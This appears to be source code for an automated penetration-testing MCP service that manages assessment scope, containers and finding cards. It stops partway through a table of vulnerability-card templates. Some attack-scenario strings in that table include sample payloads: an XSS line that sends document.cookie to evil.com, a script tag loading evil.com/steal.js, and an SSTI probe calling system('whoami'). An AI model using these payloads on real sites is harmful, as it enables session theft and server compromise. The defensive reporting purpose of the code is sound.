"""
AutoPentest MCP Service - Unified MCP service with structured logging
"""
import asyncio
import time
import json
import re
import sys
from dataclasses import dataclass
from typing import Any, Dict, List, Optional
from pathlib import Path
import httpx

# Add parent directories to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.logger import get_logger
from utils.log_context import set_assessment_id, set_container_name

# Global structured logger
logger = get_logger(__name__)
file_log = logger  # Alias for backward compatibility
log = logger  # Alias for backward compatibility


@dataclass
class SafeResult:
    """Structured result for safe_add_* methods.

    Replaces the previous Optional[Dict] return type so callers can
    distinguish success, skip (duplicate / no assessment), and error.
    """
    ok: bool
    data: Optional[Dict[str, Any]] = None
    skipped: bool = False
    reason: str = ""

    def __bool__(self) -> bool:
        return self.ok


class AssessmentScopeProvider:
    """Provides per-assessment scope validators and budget trackers.

    Manages caching and lazy-loading of scope configuration and budget state
    from the database. Each assessment gets its own isolated scope and budget.
    """

    def __init__(self, pool):
        """Initialize the scope provider.

        Parameters
        ----------
        pool : asyncpg.Pool
            Database connection pool for loading scope and budget state.
        """
        self.pool = pool
        self._validator_cache: Dict[int, Any] = {}  # assessment_id -> TargetValidator
        self._budget_tracker_cache: Dict[int, Any] = {}  # assessment_id -> BudgetTracker
        self._scope_cache: Dict[int, Any] = {}  # assessment_id -> EngagementScope
        self._cache_timestamps: Dict[int, float] = {}  # assessment_id -> timestamp
        self._cache_ttl: float = 300.0  # 5 minutes
        logger.info("AssessmentScopeProvider initialized")

    async def get_scope(self, assessment_id: int) -> Optional[Any]:
        """Get the scope configuration for an assessment.

        Parameters
        ----------
        assessment_id : int
            Assessment ID to get scope for.

        Returns
        -------
        EngagementScope or None
            Scope configuration, or None if no scope configured.
        """
        # Check cache
        now = time.time()
        if assessment_id in self._scope_cache:
            cache_age = now - self._cache_timestamps.get(assessment_id, 0)
            if cache_age < self._cache_ttl:
                logger.debug(f"Using cached scope for assessment {assessment_id}")
                return self._scope_cache[assessment_id]

        # Load from database with file fallback
        try:
            from lib.scope_loader import load_scope_hybrid
            scope = await load_scope_hybrid(
                assessment_id,
                self.pool,
                fallback_file="./scope/engagement.yaml",
            )
            self._scope_cache[assessment_id] = scope
            self._cache_timestamps[assessment_id] = now
            logger.info(f"Loaded scope for assessment {assessment_id}")
            return scope
        except Exception as exc:
            logger.warning(f"Failed to load scope for assessment {assessment_id}: {exc}")
            return None

    async def get_validator(self, assessment_id: int) -> Optional[Any]:
        """Get the scope validator for an assessment.

        Parameters
        ----------
        assessment_id : int
            Assessment ID to get validator for.

        Returns
        -------
        TargetValidator or None
            Validator for this assessment's scope, or None if no scope configured.
        """
        # Check cache
        now = time.time()
        if assessment_id in self._validator_cache:
            cache_age = now - self._cache_timestamps.get(assessment_id, 0)
            if cache_age < self._cache_ttl:
                logger.debug(f"Using cached validator for assessment {assessment_id}")
                return self._validator_cache[assessment_id]

        # Get scope and create validator
        scope = await self.get_scope(assessment_id)
        if not scope:
            return None

        try:
            from lib.scope_validator import TargetValidator
            validator = TargetValidator(scope)
            self._validator_cache[assessment_id] = validator
            self._cache_timestamps[assessment_id] = now
            logger.info(f"Created validator for assessment {assessment_id}")
            return validator
        except Exception as exc:
            logger.warning(f"Failed to create validator for assessment {assessment_id}: {exc}")
            return None

    async def get_budget_tracker(self, assessment_id: int) -> Optional[Any]:
        """Get the budget tracker for an assessment.

        Parameters
        ----------
        assessment_id : int
            Assessment ID to get budget tracker for.

        Returns
        -------
        BudgetTracker or None
            Budget tracker for this assessment, or None if no scope configured.
        """
        # Check cache
        now = time.time()
        if assessment_id in self._budget_tracker_cache:
            cache_age = now - self._cache_timestamps.get(assessment_id, 0)
            if cache_age < self._cache_ttl:
                logger.debug(f"Using cached budget tracker for assessment {assessment_id}")
                return self._budget_tracker_cache[assessment_id]

        # Get scope and create budget tracker
        scope = await self.get_scope(assessment_id)
        if not scope:
            return None

        try:
            from lib.budget_tracker import BudgetTracker
            tracker = BudgetTracker(
                constraints=scope.constraints,
                assessment_id=assessment_id,
                pool=self.pool,
            )
            # Initialize tracker (loads state from DB)
            await tracker.initialize()

            self._budget_tracker_cache[assessment_id] = tracker
            self._cache_timestamps[assessment_id] = now
            logger.info(f"Created budget tracker for assessment {assessment_id}")
            return tracker
        except Exception as exc:
            logger.warning(f"Failed to create budget tracker for assessment {assessment_id}: {exc}")
            return None

    def invalidate_cache(self, assessment_id: int) -> None:
        """Invalidate cached scope/validator/tracker for an assessment.

        Call this when scope configuration changes to force reload.

        Parameters
        ----------
        assessment_id : int
            Assessment ID to invalidate cache for.
        """
        self._scope_cache.pop(assessment_id, None)
        self._validator_cache.pop(assessment_id, None)
        self._budget_tracker_cache.pop(assessment_id, None)
        self._cache_timestamps.pop(assessment_id, None)
        logger.info(f"Invalidated scope cache for assessment {assessment_id}")


class AutoPentestService:
    """AutoPentest MCP service with backend integration and container management"""

    def __init__(self, backend_url: str = None):
        # Load backend URL from environment or use default
        import os
        self.backend_url = backend_url or os.getenv("BACKEND_API_URL", "http://localhost:8000/api")
        self.workspace_dir = os.getenv("WORKSPACE_BASE", "/app/workspaces")
        self.sast_repos_dir = os.getenv("SAST_REPOS_DIR", "/app/sast_repos")
        self.current_assessment_id: Optional[int] = None
        self.current_assessment_name: Optional[str] = None
        self.current_base_url: Optional[str] = None  # Fix B3: Add current_base_url attribute
        self.http_client: Optional[httpx.AsyncClient] = None

        # Phase-filtered tool visibility
        self._show_all_tools: bool = False
        self._phase_cache: Optional[int] = None
        self._phase_cache_ts: float = 0

        # Docker/Container management
        self.current_container: Optional[str] = None
        self.claude_container_name: str = "kali-autopentest"  # Default Kali container for AutoPentest
        self.containers_cache: List[Dict[str, Any]] = []
        self.cache_timestamp: float = 0
        self.cache_ttl: int = 30
        self.command_history: List[Dict[str, Any]] = []
        self.max_history: int = 50
        self.is_initialized: bool = False
        self.tool_cache: Dict[str, bool] = {}
        self.current_target: Optional[str] = None

        # Card deduplication cache
        self._card_title_cache: set = set()
        self._card_cache_assessment_id: Optional[int] = None

        # Activity logger for detailed audit trails (Fix 3)
        self.activity_logger: Optional[Any] = None

        # Output formatting settings
        self.output_max_length: int = 5000  # Default value
        self.output_max_length_cache_time: float = 0
        self.output_max_length_cache_ttl: int = 60  # Cache for 60 seconds

        # Command history settings
        self.command_history_limit: int = 10  # Default value
        self.command_history_limit_cache_time: float = 0
        self.command_history_limit_cache_ttl: int = 60  # Cache for 60 seconds

        # Scope provider (initialized in initialize() method)
        self.scope_provider: Optional[AssessmentScopeProvider] = None

    async def initialize(self):
        """Initialize HTTP client, asyncpg pool, and auto-detect containers"""
        if hasattr(self, 'http_client') and self.http_client is not None:
            try:
                await self.http_client.aclose()
            except Exception:
                pass
        self.http_client = httpx.AsyncClient(timeout=120.0)

        # Create asyncpg connection pool for the world model database
        try:
            import asyncpg
            import os
            db_url = os.getenv(
                "DATABASE_URL",
                "postgresql://autopentest:autopentest@localhost:5433/autopentest_db",
            )
            self.pg_pool = await asyncpg.create_pool(db_url, min_size=2, max_size=10)

            # Register the pool with the world model module
            from lib.world_model_db import set_shared_pool
            set_shared_pool(self.pg_pool)

            # Initialize scope provider for per-assessment scope management
            self.scope_provider = AssessmentScopeProvider(self.pg_pool)

            # Ensure activity_log table exists (Fix 9)
            try:
                async with self.pg_pool.acquire() as conn:
                    exists = await conn.fetchval(
                        "SELECT EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'activity_log')"
                    )
                    if not exists:
                        # Read and execute the SQL scripts
                        import os
                        scripts_dir = os.path.join(os.path.dirname(__file__), '..', '..', 'scripts')
                        for script_name in ['create_activity_log_table.sql', 'create_activity_notify_trigger.sql']:
                            script_path = os.path.join(scripts_dir, script_name)
                            if os.path.exists(script_path):
                                with open(script_path) as f:
                                    await conn.execute(f.read())
                                file_log.info(f"Executed {script_name}")
            except Exception as e:
                file_log.warning(f"Failed to ensure activity_log table: {e}")

            # Auto-initialize ActivityLogger if assessment already set (Fix 1)
            if self.current_assessment_id:
                self.initialize_activity_logger()

            file_log.info("asyncpg connection pool created for world model")
        except Exception as exc:
            file_log.warning("Failed to create asyncpg pool: %s (world model tools will not work)", exc)
            self.pg_pool = None
            self.scope_provider = None

        if not self.is_initialized:
            file_log.info("Auto-detecting Kali containers...")
            containers = await self.discover_containers()

            # Look for existing pentest container
            pentest_container = next(
                (c for c in containers if c["name"] == self.claude_container_name),
                None
            )

            if pentest_container:
                self.current_container = self.claude_container_name
                file_log.info(f"Auto-selected pentest container: {self.claude_container_name}")
            else:
                # Look for running containers first
                running_containers = [c for c in containers if "running" in c["status"].lower()]
                if running_containers:
                    self.current_container = running_containers[0]["name"]
                    file_log.info(f"Auto-selected running container: {self.current_container}")
                elif containers:
                    self.current_container = containers[0]["name"]
                    file_log.info(f"Auto-selected first available container: {self.current_container}")

            self.is_initialized = True
            log.info("MCP initialized with backend connection and Docker capabilities")

    async def cleanup(self):
        """Cleanup resources"""
        if self.http_client:
            await self.http_client.aclose()
        if hasattr(self, 'pg_pool') and self.pg_pool:
            await self.pg_pool.close()
            file_log.info("asyncpg pool closed")

    # ========== Backend Integration Methods ==========

    def initialize_activity_logger(self):
        """Initialize ActivityLogger when an assessment is loaded (Fix 3).

        Called automatically by load_assessment tool handler after setting
        current_assessment_id. Requires pg_pool to be initialized.
        """
        if self.current_assessment_id and hasattr(self, 'pg_pool') and self.pg_pool:
            try:
                from lib.activity_logger import ActivityLogger
                self.activity_logger = ActivityLogger(
                    assessment_id=self.current_assessment_id,
                    db_pool=self.pg_pool
                )
                file_log.info(f"ActivityLogger initialized for assessment {self.current_assessment_id}")
            except Exception as e:
                file_log.warning(f"Failed to initialize ActivityLogger: {e}")
                self.activity_logger = None
        else:
            self.activity_logger = None

    async def get_assessment_by_name(self, name: str) -> Optional[Dict[str, Any]]:
        """Get assessment data by name"""
        try:
            # First get the list to find the ID
            response = await self.http_client.get(f"{self.backend_url}/assessments")
            response.raise_for_status()
            assessments = response.json()

            # Find assessment by name (case-insensitive and trim whitespace)
            assessment_id = None
            for assessment in assessments:
                if assessment["name"].strip().lower() == name.strip().lower():
                    assessment_id = assessment["id"]
                    break

            if not assessment_id:
                return None

            # Get full assessment data
            detail_response = await self.http_client.get(f"{self.backend_url}/assessments/{assessment_id}")
            detail_response.raise_for_status()
            return detail_response.json()

        except Exception as e:
            log.error(f"Error fetching assessment: {e}")
            return None

    async def get_assessment_full_data(self, assessment_id: int) -> Dict[str, Any]:
        """Get complete assessment data with all related info"""
        try:
            response = await self.http_client.get(
                f"{self.backend_url}/assessments/{assessment_id}/full"
            )
            response.raise_for_status()
            return response.json()

        except Exception as e:
            log.error(f"Error fetching full assessment data: {e}")
            raise

    async def add_recon_data(
        self,
        assessment_id: int,
        data_type: str,
        name: str,
        details: Optional[Dict[str, Any]],
        discovered_in_phase: Optional[str]
    ) -> Dict[str, Any]:
        """Add recon data (endpoint, technology, service, subdomain)"""
        try:
            response = await self.http_client.post(
                f"{self.backend_url}/assessments/{assessment_id}/recon",
                json={
                    "data_type": data_type,
                    "name": name,
                    "details": details,
                    "discovered_in_phase": discovered_in_phase
                }
            )
            response.raise_for_status()
            return response.json()

        except Exception as e:
            log.error(f"Error adding recon data: {e}")
            raise

    async def add_card(
        self,
        assessment_id: int,
        card_type: str,
        title: str,
        **kwargs
    ) -> Dict[str, Any]:
        """Add a card (finding, observation, info)"""
        try:
            card_data = {
                "card_type": card_type,
                "title": title,
                **kwargs
            }

            response = await self.http_client.post(
                f"{self.backend_url}/assessments/{assessment_id}/cards",
                json=card_data
            )
            response.raise_for_status()
            return response.json()

        except Exception as e:
            log.error(f"Error adding card: {e}")
            raise

    async def update_section(
        self,
        assessment_id: int,
        section_type: str,
        section_number: float,
        title: Optional[str],
        content: str
    ) -> Dict[str, Any]:
        """Update or create a section (phase)"""
        try:
            response = await self.http_client.post(
                f"{self.backend_url}/assessments/{assessment_id}/sections",
                json={
                    "section_type": section_type,
                    "section_number": section_number,
                    "title": title,
                    "content": content
                }
            )
            response.raise_for_status()
            return response.json()

        except Exception as e:
            log.error(f"Error updating section: {e}")
            raise

    # ========== Safe Auto-Save Methods ==========

    async def card_exists(self, assessment_id: int, title: str) -> bool:
        """Check if a card with the given title already exists for this assessment.

        Uses an in-memory title cache to avoid repeated API calls.
        """
        # Invalidate cache if assessment changed
        if self._card_cache_assessment_id != assessment_id:
            self._card_title_cache.clear()
            self._card_cache_assessment_id = assessment_id

        # Check cache first
        if title in self._card_title_cache:
            return True

        # Fetch cards from backend and populate cache
        try:
            response = await self.http_client.get(
                f"{self.backend_url}/assessments/{assessment_id}/cards"
            )
            if response.status_code == 200:
                cards = response.json()
                for card in cards:
                    card_title = card.get("title", "")
                    if card_title:
                        self._card_title_cache.add(card_title)
                return title in self._card_title_cache
        except Exception as e:
            log.warning(f"card_exists: failed to fetch cards: {e}")

        return False

    async def safe_add_card(
        self,
        card_type: str,
        title: str,
        **kwargs,
    ) -> SafeResult:
        """Add a card to the current assessment, safely.

        Never raises.  Returns a :class:`SafeResult` indicating success,
        skip (duplicate / no assessment), or error.
        """
        if self.current_assessment_id is None:
            log.error(f"safe_add_card: Cannot add card '{title}' - no assessment loaded")
            return SafeResult(ok=False, skipped=True, reason="no_assessment")

        # EAGER CACHE INVALIDATION: Clear cache if assessment changed
        # This prevents false duplicate detection when switching assessments
        if self._card_cache_assessment_id != self.current_assessment_id:
            log.debug(
                f"safe_add_card: Assessment changed ({self._card_cache_assessment_id} -> "
                f"{self.current_assessment_id}), clearing card cache"
            )
            self._card_title_cache.clear()
            self._card_cache_assessment_id = self.current_assessment_id

        # Normalize severity to uppercase for consistent display (Fix: CAPS vs lowercase issue)
        if "severity" in kwargs and isinstance(kwargs["severity"], str):
            kwargs["severity"] = kwargs["severity"].upper()

        # Auto-set section_number from current phase if not provided (Fix 2)
        if "section_number" not in kwargs and self.current_assessment_id:
            try:
                from lib.phase_orchestrator import PhaseOrchestrator
                from lib.world_model_db import get_world_model_db
                db = await get_world_model_db(self.current_assessment_id)
                orch = PhaseOrchestrator(db, activity_logger=self.activity_logger)
                current_phase = await orch._get_current_phase()
                kwargs["section_number"] = str(current_phase)
                log.debug(f"safe_add_card: Auto-set section_number={current_phase} from phase orchestrator")
            except Exception as e:
                kwargs["section_number"] = "4"  # Default to phase 4 (vulnerability assessment)
                log.debug(f"safe_add_card: Failed to get current phase, defaulting to 4: {e}")

        try:
            if await self.card_exists(self.current_assessment_id, title):
                log.debug(f"safe_add_card: skipping duplicate '{title}'")
                return SafeResult(ok=True, skipped=True, reason="duplicate")

            result = await self.add_card(
                assessment_id=self.current_assessment_id,
                card_type=card_type,
                title=title,
                **kwargs,
            )
            self._card_title_cache.add(title)

            # Sync finding cards to wm_findings table (Fix 3)
            if card_type == "finding" and self.current_assessment_id:
                try:
                    from lib.world_model_db import get_world_model_db
                    db = await get_world_model_db(self.current_assessment_id)
                    # Create or find hypothesis for this finding
                    hypothesis_id = f"auto-{result.get('id', 'unknown')}"
                    await db.add_finding(
                        hypothesis_id=hypothesis_id,
                        title=title,
                        severity=kwargs.get("severity", "MEDIUM").lower(),
                        confidence=kwargs.get("confidence", 0.8),
                        evidence_ids=[],
                        remediation=kwargs.get("recommendation") or kwargs.get("remediation"),
                        metadata={
                            "source": "safe_add_card",
                            "card_id": result.get("id"),
                            "status": kwargs.get("status", "confirmed"),
                            "technical_analysis": kwargs.get("technical_analysis", "")[:2000],
                            "cvss_vector": kwargs.get("cvss_vector"),
                            "cvss_score": kwargs.get("cvss_score"),
                            "affected_endpoints": kwargs.get("affected_endpoints"),
                            "description": kwargs.get("description", "")[:2000],
                            "attack_scenario": kwargs.get("attack_scenario", "")[:2000],
                            "recommendation": kwargs.get("recommendation", "")[:2000],
                            "evidence": kwargs.get("evidence", "")[:4000],
                        }
                    )
                    log.debug(f"safe_add_card: Synced finding to wm_findings table")
                except Exception as e:
                    log.debug(f"Failed to sync finding to wm_findings: {e}")

            # Auto-mark coverage matrix when a finding is created
            if card_type == "finding":
                await self._try_mark_coverage(
                    kwargs.get("target_service"), title, kwargs.get("context")
                )

            return SafeResult(ok=True, data=result)
        except Exception as e:
            log.warning(f"safe_add_card failed for '{title}': {e}")
            return SafeResult(ok=False, reason=f"error: {e}")

    async def update_card_metadata(self, card_id: str, metadata: dict) -> bool:
        """Update card metadata for dedup merge operations.

        Args:
            card_id: ID of the card to update
            metadata: New metadata dict to merge with existing metadata

        Returns:
            True if successful, False otherwise
        """
        try:
            response = await self.http_client.patch(
                f"{self.backend_url}/assessments/{self.current_assessment_id}/cards/{card_id}",
                json={"metadata": metadata},
            )
            return response.status_code == 200
        except Exception as e:
            log.warning(f"update_card_metadata failed: {e}")
            return False

    # Signal type -> card metadata mapping (Universal Exchange Analysis - Fix 1)
    # Keys MUST match exactly what ExchangeAnalyzer emits in 'type' field
    # Format: (title, severity, vuln_class, description_template, recommendation_template, cvss_vector, attack_scenario)
    _RISK_SIGNAL_CARDS = {
        # HIGH severity (4 signals)
        "cors_wildcard": (
            "Wildcard CORS Configuration",
            "high",
            "cors_misconfig",
            "The application's CORS policy allows requests from any origin (*), which bypasses the Same-Origin Policy and enables cross-site data theft.",
            "Restrict CORS Access-Control-Allow-Origin to specific trusted domains. Never use wildcard (*) with credentials.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",  # 6.5 - Network, Low complexity, no privileges
            "An attacker hosts a malicious website at evil.com that makes JavaScript fetch() requests to the vulnerable application. Because the application returns Access-Control-Allow-Origin: *, the browser allows the cross-origin request, and the attacker's JavaScript can read the response—stealing user data, session tokens, or API keys."
        ),
        "cors_null": (
            "CORS Null Origin Allowed",
            "high",
            "cors_misconfig",
            "The application accepts CORS requests from 'null' origin, which can be exploited via sandboxed iframes or file:// URLs.",
            "Remove 'null' from allowed origins. Only whitelist specific trusted domains.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",  # 5.4 - Requires user interaction (open iframe)
            "An attacker creates an HTML page with a sandboxed iframe that makes requests to the vulnerable application. Since sandboxed iframes use 'null' as their origin, and the application allows CORS from 'null', the attacker's JavaScript can read responses containing sensitive user data."
        ),
        "cors_credentials": (
            "CORS with Credentials Enabled",
            "high",
            "cors_misconfig",
            "The application enables Access-Control-Allow-Credentials with permissive origins, allowing cross-site cookie theft.",
            "When using credentials, only allow specific trusted origins, never wildcard (*).",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",  # 5.7 - High confidentiality impact
            "An attacker tricks a logged-in user into visiting a malicious site. The attacker's JavaScript makes a fetch() request with credentials:include to the vulnerable application. Because the app allows credentials with permissive CORS, the attacker receives the user's authenticated session data."
        ),
        "template_syntax": (
            "Potential Server-Side Template Injection",
            "high",
            "ssti",
            "Template syntax ({{...}}, ${...}, etc.) is reflected in the response, indicating possible server-side template injection.",
            "Sanitize user input before passing to template engines. Use sandboxed template environments.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # 9.8 - Can lead to RCE
            "An attacker injects template syntax (e.g., {{7*7}}, ${system('whoami')}) into a URL parameter. If the application evaluates this in a server-side template (Jinja2, Twig, FreeMarker), it executes arbitrary code—allowing the attacker to read files, access databases, or execute system commands on the server."
        ),

        # MEDIUM severity (8 signals)
        "missing_csp": (
            "Missing Content Security Policy Header",
            "medium",
            "security_headers",
            "The application does not set a Content-Security-Policy header, increasing the risk of XSS attacks.",
            "Add a restrictive Content-Security-Policy header to all responses.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",  # 6.1 - Enables XSS attacks
            "An attacker finds an XSS vulnerability in the application. Because no Content-Security-Policy is present, they inject a <script src='https://evil.com/steal.js'></script> tag. The browser executes the malicious script, which steals session cookies and sends them to the attacker's server."
        ),
        "missing_hsts": (
            "Missing HTTP Strict Transport Security Header",
            "medium",
            "security_headers",
            "The application does not enforce HTTPS via the Strict-Transport-Security header, allowing downgrade attacks.",
            "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload header.",
            "CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",  # 6.4 - Man-in-the-middle risk
            "An attacker on a public Wi-Fi network performs an SSL stripping attack. When the victim accesses the site via HTTP, the attacker intercepts the connection and prevents the upgrade to HTTPS. Because no HSTS header was previously set, the browser doesn't enforce HTTPS, and the attacker can read/modify all traffic including credentials."
        ),
        "cookie_missing_httponly": (
            "Insecure Cookie - Missing HttpOnly Flag",
            "medium",
            "cookie_security",
            "Session cookies lack the HttpOnly flag, allowing JavaScript access and enabling XSS-based session theft.",
            "Set HttpOnly flag on all session cookies to prevent JavaScript access.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",  # 5.7 - Session hijacking via XSS
            "An attacker exploits an XSS vulnerability to inject JavaScript: document.location='https://evil.com/?cookie='+document.cookie. Because the session cookie lacks HttpOnly, the JavaScript can read it, and the attacker receives the victim's session token—gaining full account access."
        ),
        "cookie_missing_secure": (
            "Insecure Cookie - Missing Secure Flag",
            "medium",
            "cookie_security",
            "Session cookies lack the Secure flag, allowing transmission over unencrypted HTTP connections.",
            "Set Secure flag on all cookies to enforce HTTPS-only transmission.",
            "CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",  # 4.8 - Requires network position
            "An attacker on the same network intercepts traffic. If the user ever accesses the site via HTTP (by clicking a non-HTTPS link or typing the domain without https://), the browser sends the session cookie in plaintext. The attacker captures the cookie with a packet sniffer and hijacks the session."
        ),
        "missing_csrf_token": (
            "Missing CSRF Protection on Forms",
            "medium",
            "csrf",
            "HTML forms lack CSRF tokens, allowing cross-site request forgery attacks.",
            "Implement anti-CSRF tokens on all state-changing forms and verify them server-side.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",  # 6.5 - State-changing without consent
            "An attacker creates a malicious webpage with a hidden form that submits to the vulnerable application (e.g., change email, delete account, transfer money). When a logged-in user visits the attacker's page, the form auto-submits with the user's cookies. Because there's no CSRF token, the application accepts the request—performing unwanted actions on behalf of the victim."
        ),
        "stack_trace_disclosure": (
            "Stack Trace Information Disclosure",
            "medium",
            "info_leak_errors",
            "The application exposes stack traces in error responses, revealing internal file paths and code structure.",
            "Disable debug mode in production. Return generic error messages to users.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 5.3 - Information disclosure
            "An attacker triggers application errors (malformed input, missing parameters) to force stack traces. The traces reveal internal file paths (/var/www/app/controllers/UserController.py line 42), library versions (Django 3.2.1), and database schema details. This information helps the attacker craft targeted attacks."
        ),
        "enumerable_id": (
            "Enumerable Resource IDs (IDOR Risk)",
            "medium",
            "idor",
            "The application uses sequential integer IDs in URLs, enabling enumeration and potential unauthorized access.",
            "Use UUIDs or implement proper authorization checks on all resource access.",
            "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",  # 4.3 - Low impact until verified
            "An attacker notices the application uses sequential IDs (/api/invoices/1042). They write a script to enumerate IDs 1-10000, requesting each one. If authorization checks are weak, they can access invoices belonging to other users—viewing sensitive financial data across the entire customer base."
        ),
        "parameter_reflection": (
            "Parameter Reflected in Response (XSS Risk)",
            "medium",
            "xss_risk",
            "User input is reflected in the response without proper encoding, indicating potential XSS vulnerability.",
            "HTML-encode all user input before rendering in responses. Implement Content-Security-Policy.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",  # 6.1 - Potential XSS
            "An attacker injects XSS payloads in URL parameters: ?search=<script>alert(document.cookie)</script>. If the application reflects this unencoded in the HTML response, the script executes in the victim's browser. The attacker can then steal session cookies, modify page content, or perform actions as the victim."
        ),

        # LOW severity (6 signals)
        "missing_x_content_type_options": (
            "Missing X-Content-Type-Options Header",
            "low",
            "security_headers",
            "The application does not set X-Content-Type-Options: nosniff, allowing MIME-type sniffing attacks.",
            "Add X-Content-Type-Options: nosniff header to all responses.",
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",  # 3.1 - Requires specific conditions
            "An attacker uploads a text file containing JavaScript to the application. They trick a user into visiting the file's URL. If the browser MIME-sniffs the content (due to missing nosniff header), it may execute the JavaScript instead of displaying it as text—resulting in XSS."
        ),
        "invalid_x_content_type_options": (
            "Invalid X-Content-Type-Options Value",
            "low",
            "security_headers",
            "The X-Content-Type-Options header has an invalid value (must be 'nosniff').",
            "Set X-Content-Type-Options: nosniff (no other value is valid).",
            "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",  # 3.1 - Same as missing
            "Similar to missing X-Content-Type-Options, an invalid value means the header is ignored by browsers, allowing MIME-sniffing attacks. An attacker can exploit this by uploading malicious files that get executed as scripts when accessed."
        ),
        "missing_referrer_policy": (
            "Missing Referrer-Policy Header",
            "low",
            "security_headers",
            "The application does not control referrer information leakage via the Referrer-Policy header.",
            "Add Referrer-Policy: strict-origin-when-cross-origin or no-referrer header.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 5.3 - Minor info disclosure
            "When users click links from the application to external sites, the full URL (including query parameters with session tokens, user IDs, or other sensitive data) is sent in the Referer header. External sites or analytics services can log this information, leaking sensitive data."
        ),
        "cookie_missing_samesite": (
            "Insecure Cookie - Missing SameSite Attribute",
            "low",
            "cookie_security",
            "Cookies lack the SameSite attribute, allowing them to be sent in cross-site requests (CSRF risk).",
            "Set SameSite=Strict or SameSite=Lax on all cookies.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",  # 4.3 - Additional CSRF protection layer
            "An attacker embeds an image tag <img src='https://vulnerable-app.com/api/logout'> on their malicious site. When a logged-in user visits the malicious site, the browser automatically includes session cookies in the request (because SameSite is not set). This can enable CSRF attacks if other protections are absent."
        ),
        "missing_cache_control_no_store": (
            "Missing Cache-Control No-Store on Sensitive Endpoint",
            "low",
            "security_headers",
            "Sensitive endpoint responses may be cached by browsers or proxies.",
            "Add Cache-Control: no-store, no-cache, must-revalidate header to sensitive responses.",
            "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 3.3 - Physical access required
            "Sensitive data (personal info, financial records) is cached in the browser's disk cache. If an attacker gains physical access to the device or accesses shared computers (library, internet cafe), they can retrieve cached responses from disk and view the victim's private information."
        ),
        "sensitive_comment": (
            "Sensitive Information in HTML Comments",
            "low",
            "info_leak_comments",
            "HTML comments contain sensitive information (credentials, API keys, internal paths).",
            "Remove all sensitive data from HTML comments. Minify production HTML to strip comments.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",  # 5.3 - Direct info leak
            "An attacker views the page source and finds HTML comments containing developer notes, API keys (<!-- API_KEY: sk_live_123abc -->), or internal endpoints (<!-- TODO: Fix /admin/debug before production -->). This information helps them plan targeted attacks or directly exploit exposed credentials."
        ),

        # NEW signals from enhanced detection (Wave 2)
        "weak_password_policy": (
            "Weak Password Policy",
            "medium",
            "authentication",
            "The application accepts passwords shorter than 8 characters without complexity requirements.",
            "Enforce minimum password length of 8+ characters with complexity rules (uppercase, lowercase, numbers, special characters).",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",  # 6.5
            "An attacker creates an account with a weak password like '123' or 'ab'. Without complexity requirements, they can use dictionary attacks or brute force to guess other users' passwords, gaining unauthorized access to accounts."
        ),
        "missing_mfa": (
            "Missing Multi-Factor Authentication",
            "medium",
            "authentication",
            "Login endpoint accepts username/password without requiring a second authentication factor.",
            "Implement MFA (TOTP, SMS, or hardware key) for all user authentication, especially privileged accounts.",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",  # 6.5
            "An attacker who obtains a user's password (via phishing, credential stuffing, or data breach) can directly log in without any additional verification. MFA would prevent unauthorized access even with compromised passwords."
        ),
        "price_tampering": (
            "Price/Amount Tampering Risk",
            "medium",
            "business_logic",
            "Numeric price, amount, or financial fields are submitted in the request body, potentially allowing client-side manipulation.",
            "Validate all financial values server-side. Never trust client-submitted prices or amounts.",
            "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",  # 6.5
            "An attacker intercepts a purchase request and modifies the 'price' field from 99.99 to 0.01 before submitting. If the server doesn't validate prices against its catalog, the attacker buys products at attacker-controlled prices."
        ),
        "sequential_id_enumeration": (
            "Sequential ID Enumeration Risk",
            "medium",
            "idor",
            "Sequential numeric IDs in URL paths enable resource enumeration and potential unauthorized access.",
            "Use UUIDs instead of sequential IDs. Implement proper authorization checks on all resource access.",
            "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",  # 4.3
            "An attacker notices the URL /api/orders/1042 and writes a script to request IDs 1-10000. Without proper authorization checks, they access other users' orders, viewing sensitive personal and financial information."
        ),
        "bulk_export_unrestricted": (
            "Unrestricted Bulk Data Export",
            "medium",
            "data_exposure",
            "Export endpoint returns large data sets without pagination or access controls.",
            "Implement pagination, rate limiting, and access controls on export endpoints. Limit response sizes.",
            "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",  # 6.5
            "An attacker discovers a /api/export/users endpoint that returns all user records in a single response. By downloading the export, the attacker obtains the entire user database including personal information, violating data protection requirements."
        ),
        "graphql_introspection": (
            "GraphQL Introspection Enabled",
            "medium",
            "graphql",
            "GraphQL introspection is enabled, exposing the full API schema including all types, queries, and mutations.",
